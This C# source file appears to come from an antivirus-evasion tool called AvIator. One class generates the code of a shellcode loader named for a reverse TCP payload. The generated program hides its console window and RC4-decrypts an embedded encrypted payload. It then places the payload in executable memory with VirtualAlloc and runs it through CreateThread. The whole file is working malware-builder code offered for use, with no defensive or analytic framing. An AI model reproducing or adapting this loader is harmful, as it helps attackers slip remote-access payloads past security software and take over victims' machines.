using System;


namespace AvIator
{
    class VirtualAllocTech
    {
        String code;

        public VirtualAllocTech(String decKey, String encPayload)
        {
            code = @"
                                using System;
                                using System.Collections.Generic;
                                using System.Linq;
                                using System.Runtime.InteropServices;


                                namespace NativePayload_Reverse_tcp
                                {
                                    class Program
                                    {
        
                                        static void Main(string[] args)
                                        {
                                            var handle = GetConsoleWindow();
                                            ShowWindow(handle, SW_HIDE);
                                            string Payload_Encrypted;
                                            Payload_Encrypted = """ + encPayload +
                                            @""";string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
                                            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
                                            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                                            {
                                                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                                                _X_to_Bytes[i] = current;
                                            }
                                            byte[] KEY = {" + decKey + @"};
                                            byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);

                                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                            Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
                                            IntPtr hThread = IntPtr.Zero;
                                            UInt32 threadId = 0;
                                            IntPtr pinfo = IntPtr.Zero;
                                            /// execute native code
                                            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                            WaitForSingleObject(hThread, 0xFFFFFFFF);


                                        }

                                        const int SW_HIDE = 0;
                                        const int SW_SHOW = 5;
                                        private static UInt32 MEM_COMMIT = 0x1000;
                                        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                                        ///private static UInt32 PAGE_EXECUTE_READWRITE = 0x80;

                                        public static byte[] Decrypt(byte[] key, byte[] data)
                                        {
                                            return EncryptOutput(key, data).ToArray();
                                        }
                                        private static byte[] EncryptInitalize(byte[] key)
                                        {
                                            byte[] s = Enumerable.Range(0, 256)
                                              .Select(i => (byte)i)
                                              .ToArray();

                                            for (int i = 0, j = 0; i < 256; i++)
                                            {
                                                j = (j + key[i % key.Length] + s[i]) & 255;

                                                Swap(s, i, j);
                                            }

                                            return s;
                                        }
                                        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
                                        {
                                            byte[] s = EncryptInitalize(key);

                                            int i = 0;
                                            int j = 0;

                                            return data.Select((b) =>
                                            {
                                                i = (i + 1) & 255;
                                                j = (j + s[i]) & 255;

                                                Swap(s, i, j);

                                                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                                            });
                                        }
                                        private static void Swap(byte[] s, int i, int j)
                                        {
                                            byte c = s[i];

                                            s[i] = s[j];
                                            s[j] = c;
                                        }

                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                                        [DllImport(""kernel32"")]
                                        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
                                        [DllImport(""kernel32"")]
                                        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
                                        [DllImport(""kernel32"")]
                                        private static extern bool CloseHandle(IntPtr handle);
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                                        [DllImport(""kernel32"")]
                                        private static extern IntPtr GetModuleHandle(string moduleName);
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 LoadLibrary(string lpFileName);
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 GetLastError();
                                        [DllImport(""kernel32"")]
                                        static extern IntPtr GetConsoleWindow();
                                        [DllImport(""User32"")]
                                        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
                                    }
                                }";
        }


        public String GetCode()
        {
            return code;
        }

    }
}
